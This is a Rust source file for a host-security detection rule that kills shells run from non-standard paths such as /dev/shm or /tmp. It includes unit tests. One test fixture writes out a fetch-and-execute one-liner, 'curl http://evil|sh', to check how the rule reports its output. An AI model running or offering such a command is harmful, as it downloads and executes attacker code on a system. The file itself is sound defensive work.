//! R017 — Interactive shell binary from a non-standard path (Tappa
//! 10.5 D2).
//!
//! MITRE T1059.004 (Command and Scripting Interpreter: Unix Shell).
//! Extends the R001–R003 staging-path family: a shell whose `comm` is
//! `sh`/`bash`/`dash` but whose `filename` is NOT under `/bin` or
//! `/usr/bin` is a copied/renamed shell in an odd location — a
//! reverse-shell / dropper shape. Design §7.1: comm ∈ {sh, bash,
//! dash} & filename ∉ {/bin, /usr/bin}, gated by the path-derived
//! check + `process-comm-allowlist`.
//!
//! Note on ordering (external audit PROC-009): R017 evaluates ahead of
//! the staging rules R001..R003, so `/tmp/bash` is attributed here
//! (High) rather than to R001 (Medium); R004 (fileless, Critical), R009
//! (root from a user path) and R010 (webroot) still come first.
//!
//! Lab PR 166: the copied shell is the payload itself, so the response is
//! the tree, as for R001..R003. The allowlist and the trusted-actor record
//! (PROC-008) are unchanged.
//!
//! External audit PROC-011 (lab PR 166): the trees only root can write
//! where a distribution or an administrator installs a shell
//! (`/usr/local/bin`, `/usr/sbin`, `/sbin`, `/nix/store`) are standard too;
//! a script with `#!/usr/local/bin/bash` was killed.

use std::sync::Arc;

use common::{Event, ResponseAction, Severity, Verdict};

use crate::config::comm_allowlist::CommAllowlist;
use crate::config::comm_allowlist::Judgement;
use crate::decision::{rules::build_verdict, Rule};

/// Interactive shell comms (design §7.1).
const SHELL_COMMS: &[&str] = &["sh", "bash", "dash"];

/// The directories a shell legitimately runs from; a shell `comm` from
/// anywhere else is flagged. Each is writable by root only, so an
/// unprivileged user gains nothing from the exemption.
///
/// - `/bin/`, `/usr/bin/`: the distribution's shells (design §7.1).
/// - `/usr/local/bin/`: a shell an administrator built or installed
///   (external audit PROC-011).
/// - `/usr/sbin/`, `/sbin/`: the system's other binary directories, where
///   a distribution may place a shell.
/// - `/nix/store/`: every Nix-built shell, the system's included.
///
/// Not `/opt/`: an application user often owns its subtree. Not `/snap/`
/// until a lab run shows what a snap shell looks like to the sensor.
const SHELL_STD_PREFIXES: &[&str] = &[
    "/bin/",
    "/usr/bin/",
    "/usr/local/bin/",
    "/usr/sbin/",
    "/sbin/",
    "/nix/store/",
];

pub struct R017ShellFromNonstandardPath {
    allowlist: Arc<CommAllowlist>,
}

impl R017ShellFromNonstandardPath {
    pub fn new(allowlist: Arc<CommAllowlist>) -> Self {
        Self { allowlist }
    }
}

impl Rule for R017ShellFromNonstandardPath {
    fn id(&self) -> &'static str {
        "R017_ShellFromNonstandardPath"
    }
    fn name(&self) -> &'static str {
        "Shell binary from non-standard path"
    }
    fn category(&self) -> &'static str {
        "execution"
    }

    fn evaluate(&self, event: &Event) -> Option<Verdict> {
        let Event::ProcessSpawn {
            comm,
            filename,
            argv,
            parent_comm,
            exe,
            ..
        } = event
        else {
            return None;
        };
        if !SHELL_COMMS.contains(&comm.as_str()) {
            return None;
        }
        // Review 61: the file the kernel executed (`/usr/bin/../../tmp/sh`
        // is not under /usr/bin; a symlink to /usr/bin/bash is).
        let filename = exe.path_or(filename);
        // Fail-safe: an EMPTY filename means the sensor could not read
        // the exec path (a tracepoint layout the agent did not expect —
        // RHEL 9 shifted `sched_process_exec.filename` and this rule
        // killed every `sh` on AlmaLinux 9). "Not under a standard
        // prefix" must never be inferred from a missing attribute.
        if filename.is_empty() {
            return None;
        }
        if SHELL_STD_PREFIXES.iter().any(|p| filename.starts_with(p)) {
            return None;
        }
        // External audit NETR-003 class: the allowlist judged on what the
        // kernel executed, not on the comm the process chose.
        let judgement = super::judge_spawn(&self.allowlist, event);
        if judgement == Judgement::Allowed {
            return None;
        }
        // D5: `-c <payload>` is inline command exec (the reverse-shell
        // one-liner shape); parent_comm gives provenance context (§5.2 —
        // sshd-spawned vs cron/nginx-spawned). Both additive.
        let mut reasoning = String::from(
            "Interactive shell (sh/bash/dash) exec from a non-standard \
             path — copied/renamed shell / reverse-shell shape \
             (T1059.004); posture → ENGAGED",
        );
        if let Some(idx) = argv.iter().position(|a| a == "-c") {
            if let Some(payload) = argv.get(idx + 1) {
                reasoning = format!("{reasoning} — inline command (-c): {payload}");
            } else {
                reasoning = format!("{reasoning} — inline -c command");
            }
        }
        if !parent_comm.is_empty() {
            reasoning = format!("{reasoning}; spawned by {parent_comm}");
        }
        // External audit PROC-008: and on the program's lineage.
        Some(super::judge_actor(
            &self.allowlist,
            event,
            judgement.apply(
                build_verdict(
                    self,
                    event,
                    ResponseAction::KillProcessTree,
                    Severity::High,
                    &reasoning,
                ),
                comm,
            ),
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::decision::rules::testutil::{spawn, spawn_full};

    fn rule() -> R017ShellFromNonstandardPath {
        R017ShellFromNonstandardPath::new(Arc::new(CommAllowlist::default()))
    }

    /// An empty filename is "unknown", never "non-standard": the exec
    /// sensor reported it on RHEL 9 before the tracepoint header shift
    /// was handled, and this rule killed every `sh`.
    #[test]
    fn empty_filename_never_fires() {
        assert!(rule().evaluate(&spawn("sh", "")).is_none());
        assert!(rule().evaluate(&spawn("bash", "")).is_none());
    }

    /// Review 61: the exemption applies to the file the kernel executed —
    /// `/usr/bin/../../dev/shm/sh` is not under /usr/bin, a symlink in
    /// /usr/local/bin to /usr/bin/bash is.
    #[test]
    fn exemption_reads_the_executed_file() {
        use crate::decision::rules::testutil::spawn_exe;
        let evasion = spawn_exe("sh", "/usr/bin/../../dev/shm/sh", "/dev/shm/sh", 0);
        assert!(rule().evaluate(&evasion).is_some());
        let symlink = spawn_exe("bash", "/usr/local/bin/bash", "/usr/bin/bash", 0);
        assert!(rule().evaluate(&symlink).is_none());
    }

    #[test]
    fn fires_on_shell_from_nonstandard_path() {
        for path in ["/opt/evil/sh", "/dev/shm/bash", "/srv/x/dash"] {
            let comm = path.rsplit('/').next().unwrap();
            let v = rule()
                .evaluate(&spawn(comm, path))
                .unwrap_or_else(|| panic!("should fire on {path}"));
            assert_eq!(v.rule_id, "R017_ShellFromNonstandardPath");
            assert_eq!(v.action, ResponseAction::KillProcessTree);
            assert_eq!(v.severity, Severity::High);
        }
    }

    /// Lab PR 166: a copied shell's children die with it.
    #[test]
    fn r017_kills_the_process_tree() {
        let v = rule().evaluate(&spawn("sh", "/dev/shm/sh")).expect("fires");
        assert_eq!(v.action, ResponseAction::KillProcessTree);
    }

    /// External audit PROC-011: an administrator's shell in /usr/local/bin
    /// (a `#!/usr/local/bin/bash` script) is not flagged.
    #[test]
    fn shell_from_usr_local_bin_is_not_flagged() {
        for path in [
            "/usr/local/bin/bash",
            "/usr/local/bin/sh",
            "/usr/sbin/bash",
            "/sbin/sh",
        ] {
            let comm = path.rsplit('/').next().unwrap();
            assert!(rule().evaluate(&spawn(comm, path)).is_none(), "{path}");
        }
    }

    /// External audit PROC-011: a Nix-built shell is not flagged.
    #[test]
    fn nix_store_shell_is_not_flagged() {
        let path = "/nix/store/8c3x0yv5gq7h0kqz1dvl3j2p9q1m4r2s-bash-5.2p32/bin/bash";
        assert!(rule().evaluate(&spawn("bash", path)).is_none());
    }

    /// External audit PROC-011: the trees anyone can write, and `/opt`,
    /// stay flagged.
    #[test]
    fn writable_and_opt_shells_still_fire() {
        for path in [
            "/opt/evil/sh",
            "/dev/shm/bash",
            "/home/alice/.x/bash",
            "/tmp/bash",
            "/usr/local/lib/x/bash",
        ] {
            let comm = path.rsplit('/').next().unwrap();
            let v = rule()
                .evaluate(&spawn(comm, path))
                .unwrap_or_else(|| panic!("should fire on {path}"));
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{path}");
        }
    }

    #[test]
    fn argv_inline_command_and_parent_enrich_reasoning() {
        let ev = spawn_full(
            "sh",
            "/dev/shm/sh",
            1000,
            &["sh", "-c", "curl http://evil|sh"],
            "sshd",
        );
        let v = rule().evaluate(&ev).expect("fires");
        assert_eq!(v.severity, Severity::High); // base preserved
        assert!(v
            .reasoning
            .contains("inline command (-c): curl http://evil|sh"));
        assert!(v.reasoning.contains("spawned by sshd"));
    }

    #[test]
    fn fires_without_argv_graceful_degrade() {
        let v = rule()
            .evaluate(&spawn("bash", "/dev/shm/bash"))
            .expect("fires");
        assert!(!v.reasoning.contains("inline command"));
        assert!(!v.reasoning.contains("spawned by"));
    }

    #[test]
    fn ignores_shell_from_standard_path() {
        assert!(rule().evaluate(&spawn("bash", "/bin/bash")).is_none());
        assert!(rule().evaluate(&spawn("sh", "/usr/bin/sh")).is_none());
        // A non-shell binary from a non-standard path is not R017's job.
        assert!(rule()
            .evaluate(&spawn("payload", "/opt/evil/payload"))
            .is_none());
    }

    #[test]
    fn allowlisted_comm_is_exempt() {
        let r = R017ShellFromNonstandardPath::new(Arc::new(CommAllowlist::from_iter_owned([
            "bash".to_string(),
        ])));
        assert!(r.evaluate(&spawn("bash", "/opt/tools/bash")).is_none());
        // A different shell comm not on the allowlist still fires.
        assert!(r.evaluate(&spawn("dash", "/opt/tools/dash")).is_some());
    }

    /// External audit NETR-003 class: the allowlist reads the file the
    /// kernel executed — a shell copied where anyone can write, named
    /// like an allowlisted program, is still killed.
    #[test]
    fn a_copied_shell_named_like_an_allowlisted_program_still_fires() {
        let r = R017ShellFromNonstandardPath::new(Arc::new(CommAllowlist::from_iter_owned([
            "bash".to_string(),
        ])));
        let v = r
            .evaluate(&spawn("bash", "/dev/shm/bash"))
            .expect("a copy in /dev/shm is not the allowlisted bash");
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        assert!(v.reasoning.contains("named 'bash'"), "{}", v.reasoning);
    }
}
